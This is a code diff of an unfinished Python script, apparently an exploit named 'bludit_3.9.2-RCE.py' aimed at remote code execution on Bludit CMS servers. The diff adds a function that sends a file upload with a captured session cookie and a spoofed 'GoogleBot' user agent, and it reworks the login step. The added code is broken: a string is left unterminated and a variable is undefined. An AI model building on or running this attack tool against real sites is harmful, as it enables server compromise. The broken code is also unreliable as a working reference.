@@ -7,9 +7,7 @@ from random import randint
 
 def banner():
     print("NO banner yet")
-
-
-
+    
 def argument_parser():
     parser = argparse.ArgumentParser(prog="bludit_3.9.2-RCE.py",usage="./bludit_3.9.2-RCE.py")
     parser.add_argument("--host",type=str,required=True,help="Specify host to connect Ex:[google.com]")
@@ -27,8 +25,18 @@ def argument_checker(args):
     HTTPHandler.connect()
     
     HTTPHandler,cookie,token = argument_checker_host(HTTPHandler, args.host, args.path)
-    HTTPHandler,args.path = argument_checker_credentials(HTTPHandler, args.host, args.path, cookie, token, args.usr, args.psw)
+    HTTPHandler = argument_checker_credentials(HTTPHandler, args.host, args.path, cookie, token, args.usr, args.psw)
+    upload_image(HTTPHandler, args.host, cookie)
     argument_checker_command(args.command)
+
+def upload_image(HTTPHandler, host, cookie):
+    header = {
+        "HOST":host,
+        "User-Agent":"GoogleBot",
+        "Connection":"close",
+        "Cookie":cookie,
+        "Content-Length":len(bodydata),
+        "Content-TYpe":"multipart/form-data; 
 
 def argument_checker_host(HTTPHandler,host,path):
     """ 
@@ -76,13 +84,11 @@ def argument_checker_credentials(HTTPHandler, host, path, cookie, token, usernam
         response = HTTPHandler.getresponse()
     except:
         ERROR("argument_checker_credentials","unable to send POST request")
-    path = response.getheader("Location")
-    if path == None:
+    if response.getheader("Location")== None:
         ERROR("argument_checker_credentials","invalid credentials")
 
-    return HTTPHandler,path
+    return HTTPHandler
         
-
 def argument_checker_command(cmd):
     print(cmd)
 
